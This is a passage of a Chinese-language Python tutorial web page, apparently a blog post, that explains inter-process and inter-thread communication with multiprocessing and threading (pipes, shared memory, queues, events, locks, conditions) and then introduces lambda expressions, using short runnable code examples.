id="管道（Pipe）"><a href="#管道（Pipe）" class="headerlink" title="管道（Pipe）"></a>管道（Pipe）</h2><p>管道是另一种简单的进程间通信机制，适用于两个进程之间的数据传输。管道提供了两端，一端写入数据，另一端读取数据。管道适用于数据量较小或两个进程之间的简单通信。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>(<span class="params">pipe</span>):</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    pipe.send(<span class="string">&quot;Hello from the process!&quot;</span>)  <span class="comment"># 向管道发送数据</span></span><br><span class="line">    pipe.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 创建管道</span></span><br><span class="line">    parent_conn, child_conn = multiprocessing.Pipe()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建进程并启动</span></span><br><span class="line">    process = multiprocessing.Process(target=worker, args=(child_conn,))</span><br><span class="line">    process.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从管道接收数据</span></span><br><span class="line">    result = parent_conn.recv()</span><br><span class="line">    <span class="built_in">print</span>(result)  <span class="comment"># 输出：Hello from the process!</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待进程完成</span></span><br><span class="line">    process.join()</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>Pipe()</code>创建了一个管道，<code>parent_conn</code>和<code>child_conn</code>分别代表管道的两端。进程通过<code>child_conn.send()</code>将数据发送到管道，主进程通过<code>parent_conn.recv()</code>接收数据。</p><h2 id="共享内存（Value-Array）"><a href="#共享内存（Value-Array）" class="headerlink" title="共享内存（Value&#x2F;Array）"></a>共享内存（Value&#x2F;Array）</h2><p>共享内存是另一种进程间通信的方式，允许多个进程访问同一内存区域。<code>Value</code>和<code>Array</code>是<code>multiprocessing</code>模块提供的共享内存对象，分别用于存储单一的值和数组。</p><h3 id="使用Value进行共享内存通信"><a href="#使用Value进行共享内存通信" class="headerlink" title="使用Value进行共享内存通信"></a>使用<code>Value</code>进行共享内存通信</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>(<span class="params">val</span>):</span><br><span class="line">    val.value += <span class="number">1</span>  <span class="comment"># 修改共享内存中的值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 创建共享内存变量</span></span><br><span class="line">    shared_value = multiprocessing.Value(<span class="string">&#x27;i&#x27;</span>, <span class="number">0</span>)  <span class="comment"># &#x27;i&#x27;表示整型</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建多个进程并启动</span></span><br><span class="line">    processes = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        p = multiprocessing.Process(target=worker, args=(shared_value,))</span><br><span class="line">        processes.append(p)</span><br><span class="line">        p.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待进程完成</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Shared value: <span class="subst">&#123;shared_value.value&#125;</span>&quot;</span>)  <span class="comment"># 输出：Shared value: 5</span></span><br></pre></td></tr></table></figure><p>在此示例中，<code>shared_value</code>是一个共享内存变量，多个进程都能访问并修改它的值。<code>multiprocessing.Value</code>创建了一个共享的整型变量。</p><h3 id="使用Array进行共享内存通信"><a href="#使用Array进行共享内存通信" class="headerlink" title="使用Array进行共享内存通信"></a>使用<code>Array</code>进行共享内存通信</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>(<span class="params">arr</span>):</span><br><span class="line">    arr[<span class="number">0</span>] += <span class="number">1</span>  <span class="comment"># 修改共享数组中的元素</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 创建共享内存数组</span></span><br><span class="line">    shared_array = multiprocessing.Array(<span class="string">&#x27;i&#x27;</span>, [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])  <span class="comment"># &#x27;i&#x27;表示整型数组</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建多个进程并启动</span></span><br><span class="line">    processes = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        p = multiprocessing.Process(target=worker, args=(shared_array,))</span><br><span class="line">        processes.append(p)</span><br><span class="line">        p.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待进程完成</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Shared array: <span class="subst">&#123;<span class="built_in">list</span>(shared_array)&#125;</span>&quot;</span>)  <span class="comment"># 输出：Shared array: [5, 0, 0]</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>shared_array</code>是一个共享的整数数组，多个进程并发地修改数组的内容。<code>multiprocessing.Array</code>提供了一个共享内存数组，进程间可以直接修改它的元素。</p><h2 id="进程间通信的同步"><a href="#进程间通信的同步" class="headerlink" title="进程间通信的同步"></a>进程间通信的同步</h2><p>在进程间共享内存时，由于多个进程可能同时修改共享数据，因此需要使用同步机制，防止数据竞争或出现不一致的情况。<code>multiprocessing</code>模块提供了多种同步工具，例如<code>Lock</code>、<code>Semaphore</code>等。</p><h3 id="使用Lock同步进程"><a href="#使用Lock同步进程" class="headerlink" title="使用Lock同步进程"></a>使用<code>Lock</code>同步进程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>(<span class="params">lock, shared_value</span>):</span><br><span class="line">    <span class="keyword">with</span> lock:</span><br><span class="line">        shared_value.value += <span class="number">1</span>  <span class="comment"># 确保对共享值的访问是互斥的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    lock = multiprocessing.Lock()</span><br><span class="line">    shared_value = multiprocessing.Value(<span class="string">&#x27;i&#x27;</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    processes = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        p = multiprocessing.Process(target=worker, args=(lock, shared_value))</span><br><span class="line">        processes.append(p)</span><br><span class="line">        p.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Shared value: <span class="subst">&#123;shared_value.value&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>在此示例中，<code>Lock</code>用于确保每次只有一个进程能够访问共享资源<code>shared_value</code>。通过<code>with lock</code>确保每个进程在修改共享数据时是互斥的，避免数据竞争。</p><hr><h1 id="线程间通信-1"><a href="#线程间通信-1" class="headerlink" title="线程间通信"></a>线程间通信</h1><p>线程间通信（Inter-Thread Communication）指的是在多个线程之间传递数据和信息。不同于进程间通信，线程是共享同一进程的内存空间，因此它们可以直接访问共享的资源和数据。线程间通信相对简单，但也需要小心数据竞争和线程同步问题。Python通过<code>threading</code>模块提供了多种线程间通信的方式，包括<strong>共享内存</strong>、<strong>队列（Queue）</strong>、以及**事件（Event）**等。</p><h2 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h2><p>由于所有线程都共享进程的内存空间，它们可以直接访问全局变量或共享对象。这种方式适合一些简单的场景，但需要注意线程间的同步问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># 共享变量</span></span><br><span class="line">shared_value = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>():</span><br><span class="line">    <span class="keyword">global</span> shared_value</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        shared_value += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Thread updated shared_value: <span class="subst">&#123;shared_value&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    threads = []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 启动多个线程</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        t = threading.Thread(target=worker)</span><br><span class="line">        threads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Final shared_value: <span class="subst">&#123;shared_value&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>在上面的示例中，<code>shared_value</code>是多个线程共享的变量。所有线程都可以直接访问并修改它。由于线程之间是并发执行的，在没有同步机制的情况下，可能会导致数据竞争问题，即多个线程同时修改共享变量，导致结果不一致。</p><h2 id="队列（Queue）-1"><a href="#队列（Queue）-1" class="headerlink" title="队列（Queue）"></a>队列（Queue）</h2><p><code>queue.Queue</code>是线程安全的，可以在多个线程之间传递数据。通过<code>put()</code>和<code>get()</code>方法，线程可以将数据放入队列或者从队列中取出数据。<code>Queue</code>实现了生产者-消费者模式，适用于多个线程之间传递数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">producer</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        q.put(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Produced: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">consumer</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        item = q.get()</span><br><span class="line">        <span class="keyword">if</span> item <span class="keyword">is</span> <span class="literal">None</span>:  <span class="comment"># 结束标志</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Consumed: <span class="subst">&#123;item&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    q = queue.Queue()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 启动生产者和消费者线程</span></span><br><span class="line">    producer_thread = threading.Thread(target=producer, args=(q,))</span><br><span class="line">    consumer_thread = threading.Thread(target=consumer, args=(q,))</span><br><span class="line"></span><br><span class="line">    producer_thread.start()</span><br><span class="line">    consumer_thread.start()</span><br><span class="line"></span><br><span class="line">    producer_thread.join()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 向队列中添加None作为结束标志</span></span><br><span class="line">    q.put(<span class="literal">None</span>)</span><br><span class="line">    </span><br><span class="line">    consumer_thread.join()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;All tasks are completed.&quot;</span>)</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>producer</code>线程将数据放入队列，而<code>consumer</code>线程从队列中获取数据并进行处理。为了结束<code>consumer</code>线程，我们向队列中放入了<code>None</code>，作为一个结束信号。使用队列可以避免多线程间共享内存的复杂性，并且<code>queue.Queue</code>本身是线程安全的。</p><h2 id="事件（Event）"><a href="#事件（Event）" class="headerlink" title="事件（Event）"></a>事件（Event）</h2><p><code>threading.Event</code>是一个简单的同步原语，用于线程之间的信号传递。一个线程可以设置事件状态为“已触发”，其他线程可以等待事件被触发。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wait_for_event</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Thread is waiting for the event to be set.&quot;</span>)</span><br><span class="line">    e.wait()  <span class="comment"># 阻塞，直到事件被触发</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Event is set! Thread is resuming.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trigger_event</span>(<span class="params">e</span>):</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Setting event...&quot;</span>)</span><br><span class="line">    e.<span class="built_in">set</span>()  <span class="comment"># 设置事件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 启动等待事件的线程</span></span><br><span class="line">    thread1 = threading.Thread(target=wait_for_event, args=(event,))</span><br><span class="line">    <span class="comment"># 启动触发事件的线程</span></span><br><span class="line">    thread2 = threading.Thread(target=trigger_event, args=(event,))</span><br><span class="line"></span><br><span class="line">    thread1.start()</span><br><span class="line">    thread2.start()</span><br><span class="line"></span><br><span class="line">    thread1.join()</span><br><span class="line">    thread2.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;All tasks are completed.&quot;</span>)</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>wait_for_event</code>线程在调用<code>e.wait()</code>时会被阻塞，直到<code>trigger_event</code>线程调用<code>e.set()</code>来触发事件。<code>Event</code>用于在一个线程中设置某种条件，然后其他线程等待这个条件的发生。</p><h2 id="锁（Lock）"><a href="#锁（Lock）" class="headerlink" title="锁（Lock）"></a>锁（Lock）</h2><p><code>Lock</code>用于确保只有一个线程能够访问共享资源。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>():</span><br><span class="line">    <span class="keyword">with</span> lock:</span><br><span class="line">        <span class="comment"># 临界区：只有一个线程能在这里执行</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;threading.current_thread().name&#125;</span> is working.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    threads = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        t = threading.Thread(target=worker)</span><br><span class="line">        threads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;All threads have finished.&quot;</span>)</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>Lock</code>用于同步多个线程的访问。通过<code>with lock</code>语句确保只有一个线程能进入临界区执行操作，避免多个线程同时修改共享资源。</p><h2 id="条件（Condition）"><a href="#条件（Condition）" class="headerlink" title="条件（Condition）"></a>条件（Condition）</h2><p><code>Condition</code>允许线程在特定条件下等待和通知其他线程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">condition = threading.Condition()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">consumer</span>():</span><br><span class="line">    <span class="keyword">with</span> condition:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Consumer is waiting for the event.&quot;</span>)</span><br><span class="line">        condition.wait()  <span class="comment"># 等待被通知</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Consumer is now consuming!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">producer</span>():</span><br><span class="line">    <span class="keyword">with</span> condition:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Producer is producing something.&quot;</span>)</span><br><span class="line">        condition.notify()  <span class="comment"># 通知等待的线程</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Producer has notified the consumer.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    consumer_thread = threading.Thread(target=consumer)</span><br><span class="line">    producer_thread = threading.Thread(target=producer)</span><br><span class="line"></span><br><span class="line">    consumer_thread.start()</span><br><span class="line">    producer_thread.start()</span><br><span class="line"></span><br><span class="line">    consumer_thread.join()</span><br><span class="line">    producer_thread.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;All tasks are completed.&quot;</span>)</span><br></pre></td></tr></table></figure><p>在这个示例中，<code>consumer</code>线程在调用<code>condition.wait()</code>时会被阻塞，直到<code>producer</code>线程调用<code>condition.notify()</code>来通知它继续执行。<code>Condition</code>提供了更复杂的同步机制，适用于需要线程间协调的场景。</p><hr><h1 id="lambda表达式"><a href="#lambda表达式" class="headerlink" title="lambda表达式"></a>lambda表达式</h1><h2 id="Lambda表达式的基本语法"><a href="#Lambda表达式的基本语法" class="headerlink" title="Lambda表达式的基本语法"></a>Lambda表达式的基本语法</h2><p>Lambda表达式是Python中用于创建匿名函数的简洁方式。它的基本语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> 参数<span class="number">1</span>, 参数<span class="number">2</span>, ... : 表达式</span><br></pre></td></tr></table></figure><ul><li><code>lambda</code>：是Python中用于定义匿名函数的关键字。</li><li><code>参数1, 参数2, ...</code>：输入参数，可以有多个，也可以没有。</li><li><code>表达式</code>：Lambda函数体，计算并返回一个值。Lambda函数只能包含一个表达式，不能有多条语句。</li></ul><h2 id="Lambda表达式的示例"><a href="#Lambda表达式的示例" class="headerlink" title="Lambda表达式的示例"></a>Lambda表达式的示例</h2><h3 id="最简单的Lambda表达式"><a href="#最简单的Lambda表达式" class="headerlink" title="最简单的Lambda表达式"></a>最简单的Lambda表达式</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add = <span class="keyword">lambda</span> x, y: x + y</span><br><span class="line"><span class="built_in">print</span>(add(<span class="number">3</span>, <span class="number">5</span>))  <span class="comment"># 输出：8</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>lambda x, y: x + y</code>创建了一个匿名函数，接受两个参数<code>x</code>和<code>y</code>，并返回它们的和。通过将其赋值给<code>add</code>变量，之后可以调用它。</p><h3 id="使用Lambda表达式创建简单的函数"><a href="#使用Lambda表达式创建简单的函数" class="headerlink" title="使用Lambda表达式创建简单的函数"></a>使用Lambda表达式创建简单的函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">square = <span class="keyword">lambda</span> x: x * x</span><br><span class="line"><span class="built_in">print</span>(square(<span class="number">4</span>))  <span class="comment"># 输出：16</span></span><br></pre></td></tr></table></figure><p>这里的Lambda表达式用于计算一个数字的平方。</p><h2 id="Lambda表达式的应用场景"><a href="#Lambda表达式的应用场景" class="headerlink" title="Lambda表达式的应用场景"></a>Lambda表达式的应用场景</h2><p>Lambda表达式非常适用于那些需要短小、简洁函数的场合，尤其是在一些高阶函数（如<code>map()</code>、<code>filter()</code>、<code>sorted()</code>等）中作为参数传递。</p><h3 id="在map-函数中使用Lambda"><a href="#在map-函数中使用Lambda" class="headerlink" title="在map()函数中使用Lambda"></a>在<code>map()</code>函数中使用Lambda</h3><p><code>map()</code>函数用于将指定函数应用于给定序列的每个元素，返回一个迭代器。Lambda表达式非常适合作为<code>map()</code>的参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">squared_numbers = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: x**<span class="number">2</span>, numbers)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(squared_numbers))  <span class="comment"># 输出：[1, 4, 9, 16, 25]</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>lambda x: x**2</code>是一个简单的匿名函数，用于计算每个数字的平方，<code>map()</code>函数应用它到<code>numbers</code>列表中的每个元素。</p><h3 id="在filter-函数中使用Lambda"><a href="#在filter-函数中使用Lambda" class="headerlink" title="在filter()函数中使用Lambda"></a>在<code>filter()</code>函数中使用Lambda</h3><p><code>filter()</code>函数用于从序列中过滤出符合条件的元素，返回一个新的迭代器。Lambda表达式可以用来定义过滤条件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">even_numbers = <span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x % <span class="number">2</span> == <span class="number">0</span>, numbers)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(even_numbers))  <span class="comment"># 输出：[2, 4, 6]</span></span><br></pre></td></tr></table></figure><p>这里的<code>lambda x: x % 2 == 0</code>是一个检查数字是否为偶数的Lambda函数，<code>filter()</code>函数将它应用于<code>numbers</code>列表，筛选出所有偶数。</p><h3 id="在sorted-函数中使用Lambda"><a href="#在sorted-函数中使用Lambda" class="headerlink" title="在sorted()函数中使用Lambda"></a>在<code>sorted()</code>函数中使用Lambda</h3><p><code>sorted()</code>函数用于排序序列，可以通过<code>key</code>参数指定排序规则。Lambda表达式常用于快速定义排序规则。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">students = [(<span class="string">&quot;Alice&quot;</span>, <span class="number">85</span>), (<span class="string">&quot;Bob&quot;</span>, <span class="number">90</span>), (<span class="string">&quot;Charlie&quot;</span>, <span class="number">78</span>)]</span><br><span class="line">sorted_students = <span class="built_in">sorted</span>(students, key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(sorted_students)  <span class="comment"># 输出：[(&#x27;Charlie&#x27;, 78), (&#x27;Alice&#x27;, 85), (&#x27;Bob&#x27;, 90)]</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>lambda x: x[1]</code>是一个用于提取每个元组中分数的Lambda函数。<code>sorted()</code>将这个函数应用于<code>students</code>列表，按照分数进行排序。</p><h3 id="在reduce-函数中使用Lambda"><a href="#在reduce-函数中使用Lambda" class="headerlink" title="在reduce()函数中使用Lambda"></a>在<code>reduce()</code>函数中使用Lambda</h3><p><code>reduce()</code>函数用于将一个序列中的所有元素通过指定的函数进行累积计算。Lambda表达式通常用于定义累积操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 